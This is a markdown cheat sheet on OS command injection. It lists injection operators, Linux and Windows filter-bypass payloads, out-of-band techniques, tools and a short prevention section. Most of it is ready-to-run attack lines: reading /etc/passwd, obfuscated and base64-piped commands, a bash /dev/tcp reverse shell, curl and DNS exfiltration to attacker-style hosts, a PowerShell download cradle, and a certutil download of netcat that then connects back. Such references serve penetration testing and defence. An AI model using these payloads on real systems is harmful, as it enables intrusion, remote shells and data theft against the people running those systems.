# Command Injection

OS command injection occurs when user input is passed unsafely to system shell. Can lead to full RCE.

## Injection Operators

| Operator | Encoded | Effect |
|----------|---------|--------|
| `;` | `%3b` | Chain commands (both execute) |
| `\|` | `%7c` | Pipe (second output usually shown) |
| `&&` | `%26%26` | Run next only if previous succeeds |
| `\|\|` | `%7c%7c` | Run next only if previous fails |
| `\n` (newline) | `%0a` | New command (both platforms) |
| `` ` `` | `%60` | Command substitution (Linux) |
| `$()` | `%24%28%29` | Subshell (Linux) |
| `>` / `>>` | ... | Redirect output (often to web dir) |

## Linux Injection & Bypasses

### Spaces & Special Chars
```bash
cat${IFS}/etc/passwd
cat</etc/passwd
{cat,/etc/passwd}
echo${PATH:0:1}bin${PATH:0:1}cat /etc/passwd
```

### Blacklist Bypass Examples
```bash
# Case
wHoAmI
$(tr '[:upper:]' '[:lower:]'<<<WhOaMi)

# Reversed
$(rev<<<imaohw)

# Base64
bash<<<$(base64 -d<<<d2hvYW1p)

# Other
echo 'cat /etc/passwd' | base64 -d | bash
```

Useful commands when limited:
- `printenv`, `env`, `set`
- `which`, `whereis`, `type`
- `ls -la /proc/*/fd` for open files
- `find / -name "*.php" 2>/dev/null` (for web shells)

### Additional Linux Bypasses & One-Liners
```bash
# IFS + brace expansion
cat${IFS}/etc/passwd
{cat,/etc/passwd}

# Command substitution tricks
echo $(echo 'whoami' | base64 | base64 -d) | bash

# Using /dev/tcp for reverse without nc
bash -i >& /dev/tcp/10.10.14.5/4444 0>&1

# Python one-liner RCE
python3 -c "import os;os.system('id')"

# Perl / Ruby alternatives when python disabled
perl -e 'exec "/bin/bash";'
ruby -e 'exec "id"'
```

## Windows Injection & Bypasses

## Windows Injection & Bypasses

### CMD
```cmd
whoami
who^ami
w'h'o'a'm'i
%HOMEPATH:~0,-17%Windows\System32\whoami.exe
```

### PowerShell
```powershell
whoami
&('w'+'ho'+'ami')
iex "$('imaohw'[-1..-20] -join '')"
[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')) | iex
```

## Blind / Out-of-Band (OOB) Techniques

When output is not shown:
- Time-based: `sleep 5`, `ping -c 5 127.0.0.1` (Linux), `timeout 5`
- DNS OOB: `ping -c 1 $(whoami).oob.attacker.com`
- HTTP OOB: `curl http://oob.attacker.com/?d=$(id | base64)`
- Tools: Burp Collaborator, interactsh, dnslog.cn, oastify

### More OOB Examples
```bash
# Linux DNS exfil
nslookup $(whoami | tr ' ' '.' | tr -d '\n').oastify.com

# Windows PowerShell OOB
powershell -c "IWR http://oastify.com/?d=$(whoami)"

# Time-based MySQL in command context (if injectable)
'; SELECT SLEEP(5); -- 
```

## More Windows RCE Examples
```cmd
# PowerShell download cradle in injection
powershell -nop -c "IEX (New-Object Net.WebClient).DownloadString('http://attacker/shell.ps1')"

# certutil download + exec
certutil -urlcache -split -f http://attacker/nc.exe nc.exe & nc.exe attacker 4444

# Using forfiles or other LOLBINs
forfiles /p c:\windows\system32 /m notepad.exe /c "cmd /c start /b calc.exe"
```

## Modern Contexts (2026)

- API endpoints accepting shell commands or template engines (SSTI → RCE)
- CI/CD pipelines, Git hooks, build scripts
- Container entrypoints / Kubernetes jobs
- Serverless functions with command exec
- Dev tools exposed (Jenkins Groovy, etc.)

Example in a vulnerable API param:
```bash
curl -X POST http://target/api/run -d 'cmd=id;whoami'
```

## Detection & Tools

- Manual + Burp/ ZAP Repeater
- `ffuf` or custom lists for common injection chars
- Nuclei templates for known RCE / injection
- Commix (legacy), or custom Python scripts

## Prevention

- Avoid shelling out. Use safe APIs / libraries.
- Strict allowlist for input.
- Escaping + parameterization.
- Sandboxing / containers with least privilege.

References: PayloadsAllTheThings Command Injection, HackTricks, OWASP.
